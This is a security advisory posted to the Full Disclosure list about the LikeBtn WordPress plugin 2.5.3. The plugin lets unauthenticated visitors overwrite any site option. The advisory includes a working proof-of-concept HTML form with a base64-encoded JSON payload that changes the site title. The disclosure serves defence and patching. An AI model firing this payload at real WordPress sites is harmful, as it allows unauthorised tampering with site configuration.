Subject: [FD] Like Button Rating ♥ LikeBtn allows anybody to set any option (WordPress plugin)

Details
================
Software: Like Button Rating ♥ LikeBtn
Version: 2.5.3
Homepage: https://wordpress.org/plugins/likebtn-like-button/
Advisory report: https://advisories.dxw.com/advisories/likebtn-set-any-option/
CVE: Awaiting assignment
CVSS: 6.4 (Medium; AV:N/AC:L/Au:N/C:P/I:P/A:N)

Description
================
Like Button Rating ♥ LikeBtn allows anybody to set any option

Vulnerability
================
In the init action, this plugin checks to see if $_POST[\'likebtn_import_config\'] is empty. If it’s not empty then it base64-decodes the string, parses it as JSON, and starts changing options.

Proof of concept
================
The below form will set the “Site Title” option to “Temmie”:
<form method=\"POST\" action=\"http://localhost/\">
 <input type=\"text\" name=\"likebtn_import_config\" value=\"ewogICJsaWtlYnRuX3NldHRpbmdzX29wdGlvbnMiOiB7CiAgICAiYmxvZ25hbWUiOiAiVGVtbWllIgogIH0KfQo=\">
 <input type=\"submit\">
</form>
This works whether you’re logged in or not. The base64-encoded JSON above is this:
{
  \"likebtn_settings_options\": {
    \"blogname\": \"Temmie\"
  }
}

Mitigations
================
Upgrade to version 2.5.4 or later.
